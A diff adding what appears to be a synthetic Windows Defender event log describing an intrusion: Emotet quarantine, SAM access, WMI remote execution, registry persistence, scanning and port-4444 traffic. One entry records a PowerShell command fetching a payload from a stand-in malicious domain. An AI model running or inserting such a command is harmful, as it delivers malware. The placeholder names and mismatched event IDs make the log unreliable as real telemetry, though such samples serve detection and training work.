@@ -1,0 +1,72 @@
+Date: 2025-03-29 19:02:12
+Source: Windows Defender
+Event ID: 5004
+Threat Name: Trojan:Win32/Emotet
+Severity: High
+Action Taken: Quarantined
+User: NT AUTHORITY\SYSTEM
+Description: Windows Defender has detected and quarantined a threat. The process "C:\Users\Public\Downloads\malicious.exe" was identified as a known malware variant (Trojan:Win32/Emotet).
+
+Date: 2025-03-29 19:05:45
+Source: Windows Defender
+Event ID: 1123
+Threat Name: Suspicious PowerShell Activity
+Severity: Medium
+Action Taken: Monitored
+User: DOMAIN\Administrator
+Description: Unusual PowerShell activity detected. Command executed: "Invoke-WebRequest -Uri http://malicious-domain.com/payload.ps1 -OutFile C:\Temp\payload.ps1".
+
+Date: 2025-03-29 19:06:30
+Source: Windows Defender
+Event ID: 1116
+Threat Name: Malicious Behavior
+Severity: Critical
+Action Taken: Blocked
+User: DOMAIN\Administrator
+Description: A process "powershell.exe" attempted to execute a script that would modify critical system files. The activity was blocked, and the process terminated.
+
+Date: 2025-03-29 19:08:00
+Source: Windows Defender
+Event ID: 5038
+Threat Name: Unauthorized Access
+Severity: High
+Action Taken: Monitored
+User: DOMAIN\User123
+Description: Unauthorized access detected on "C:\Windows\System32\config\SAM". The activity was logged and access denied.
+
+Date: 2025-03-29 19:12:14
+Source: Windows Defender
+Event ID: 1117
+Threat Name: Remote Code Execution Attempt
+Severity: Critical
+Action Taken: Blocked
+User: DOMAIN\Administrator
+Description: Detected an attempt to execute code remotely via WMI (Windows Management Instrumentation) from IP address 203.0.113.15. The attempt was blocked and logged.
+
+Date: 2025-03-29 19:15:48
+Source: Windows Defender
+Event ID: 5007
+Threat Name: Persistence Mechanism
+Severity: High
+Action Taken: Removed
+User: NT AUTHORITY\SYSTEM
+Description: A registry key modification intended for persistence was detected and removed: "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousStartup".
+
+Date: 2025-03-29 19:20:00
+Source: Windows Defender
+Event ID: 1118
+Threat Name: Network Scanner Detected
+Severity: Medium
+Action Taken: Monitored
+User: DOMAIN\Administrator
+Description: Network scanning behavior detected from process "nmap.exe" originating from "192.168.1.101". Scanning activities were logged.
+
+Date: 2025-03-29 19:25:00
+Source: Windows Defender
+Event ID: 5031
+Threat Name: Anomalous Traffic
+Severity: Critical
+Action Taken: Connection Terminated
+User: DOMAIN\Administrator
+Description: Unusual outbound traffic detected towards "203.0.113.20" on port 4444. The connection was terminated by Windows Defender.
+
